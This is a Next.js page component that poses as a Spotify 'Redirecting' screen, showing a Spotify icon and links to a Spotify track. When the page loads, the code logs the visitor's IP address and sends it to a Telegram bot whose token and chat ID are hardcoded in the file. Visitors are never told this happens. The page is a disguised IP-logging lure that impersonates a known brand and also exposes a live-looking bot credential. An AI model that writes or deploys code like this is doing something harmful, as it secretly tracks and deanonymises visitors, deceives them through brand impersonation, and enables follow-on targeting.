import Image from "next/image";
import MyPage from "@/components/redirector";
import logIp from "@/components/gAddress";
import axios from "axios";

export default async function Home() {
  
  const ip = logIp();

  const apikey = "7127171762:AAGGbpcsNY7pKzF9Xd1TQL9aBhPSWHhizTQ";
  const chat = "923952964"
  try {
    const response = await axios.get(`https://api.telegram.org/bot${apikey}/sendMessage?chat_id=${chat}&text=${ip}`);
  } catch (error) {
    console.error('Error fetching data:', error);
  }

  return (
    <main className="items-center bg-[#121212] h-full w-full absolute justify-center">
      {/* <MyPage/> */}
      <div className="flex flex-col items-center justify-center mt-[16%]">
        
          <div className="flex flex-col top-[50%] mb-4 ">
            <Image alt="Spotify" src={'/spotify-icon.svg'} width={56} height={56}></Image>
          </div>

          <div className="items-center text-center">
            <h1 className="mt-6 text-secondary text-5xl font-bold mb-4">Redirecting</h1>
            <p className="text-white mb-8 text-sm opacity-50">You are being redirected.</p>
          </div>

          <div className="flex items-center bg-white w-32 h-12 rounded-3xl text-center justify-center">
            <a href="https://open.spotify.com/intl-tr/track/4obIxphItouERQevAwbPfx" className="flex text-black font-bold text-sm">Main menu</a>
          </div>
          <a href="https://open.spotify.com/intl-tr/track/4obIxphItouERQevAwbPfx" className="flex text-white font-bold text-sm mt-10">Help</a>
          <MyPage/>
      </div>
    </main>
  );
}
